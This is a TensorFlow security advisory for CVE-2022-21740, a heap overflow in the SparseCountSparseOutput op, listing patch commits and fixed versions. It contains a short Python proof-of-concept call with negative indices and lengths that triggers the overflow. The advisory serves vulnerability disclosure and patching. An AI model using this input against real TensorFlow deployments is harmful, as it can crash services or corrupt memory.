<h2>TFSA-2022-020: Heap overflow in <code>SparseCountSparseOutput</code></h2>
<h3>CVE Number</h3>
<p>CVE-2022-21740</p>
<h3>Impact</h3>
<p>The <a href="https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/count_ops.cc#L168-L273">implementation of <code>SparseCountSparseOutput</code></a> is vulnerable to a heap overflow:</p>
<p>```python
import tensorflow as tf
import numpy as np</p>
<p>tf.raw_ops.SparseCountSparseOutput(
  indices=[[-1,-1]],
  values=[2],
  dense_shape=[1, 1],
  weights=[1],
  binary_output=True,
  minlength=-1,
  maxlength=-1,
  name=None)
```</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commits <a href="https://github.com/tensorflow/tensorflow/commit/2b7100d6cdff36aa21010a82269bc05a6d1cc74a">2b7100d6cdff36aa21010a82269bc05a6d1cc74a</a> and <a href="https://github.com/tensorflow/tensorflow/commit/adbbabdb0d3abb3cdeac69e38a96de1d678b24b3">adbbabdb0d3abb3cdeac69e38a96de1d678b24b3</a>.</p>
<p>The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.</p>
